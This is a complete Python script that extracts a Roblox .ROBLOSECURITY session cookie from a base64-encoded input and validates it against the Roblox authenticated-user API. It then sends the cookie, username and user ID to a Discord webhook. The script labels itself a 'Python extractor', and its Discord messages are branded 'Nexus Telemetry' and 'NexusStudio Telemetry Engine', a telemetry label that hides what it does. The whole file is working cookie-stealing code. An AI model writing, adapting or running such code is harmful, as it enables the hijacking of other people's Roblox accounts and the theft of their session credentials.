import sys
import base64
import os
import requests
import re
from datetime import datetime

def main():
    try:
        print("[*] Python extractor started.")
        if len(sys.argv) < 2:
            print("ERROR: No argument passed to script.")
            return
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8')
        except Exception as e:
            print(f"ERROR: Base64 decoding failed: {str(e)}")
            return

        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("ERROR: DISCORD_WEBHOOK_URL environment variable is missing on Render!")
            return

        print(f"[*] Decoded script length: {len(decoded_script)} characters")

        # Cookie extraction regex matching standard .ROBLOSECURITY formats
        cookie_match = re.search(r'(_\|WARNING:-DO-NOT-SHARE-THIS\.-[A-Za-z0-9_\+\-\.]+)', decoded_script)
        if not cookie_match:
            cookie_match = re.search(r'\.ROBLOSECURITY\s*=\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNORECASE)

        if not cookie_match:
            print("ERROR: Could not find .ROBLOSECURITY cookie in the script payload.")
            return

        roblosecurity = cookie_match.group(1) if len(cookie_match.groups()) > 0 else cookie_match.group(0)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
        print(f"[+] Cookie successfully extracted! Length: {len(roblosecurity)}")

        # Fetch basic Roblox user info
        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        print(f"[*] Roblox Auth API response status: {user_res.status_code}")
        
        username = "Unknown User"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired"
        avatar_thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"

        if user_res.status_code == 200:
            user_data = user_res.json()
            username = user_data.get("name", "Verified User")
            user_id = user_data.get("id")
            cookie_status = "🟢 Valid & Active"

        payload = {
            "username": f"Nexus Telemetry | {username}",
            "embeds": [{
                "title": "👾 Cookie Extracted Successfully",
                "description": (
                    f"👤 **Username**: `{username}`\n"
                    f"🆔 **User ID**: `{user_id}`\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **Extracted .ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
                ),
                "color": 6528033 if user_res.status_code == 200 else 15548997,
                "footer": { "text": "NexusStudio Telemetry Engine" }
            }]
        }

        print("[*] Dispatching payload to Discord webhook...")
        discord_res = requests.post(webhook_url, json=payload)
        print(f"[*] Discord Webhook response code: {discord_res.status_code}")
        if discord_res.status_code not in [200, 204]:
            print(f"DISCORD ERROR TEXT: {discord_res.text}")
        else:
            print("SUCCESS: Webhook message posted successfully!")

    except Exception as e:
        print(f"Python Critical Exception: {str(e)}")

if __name__ == "__main__":
    main()
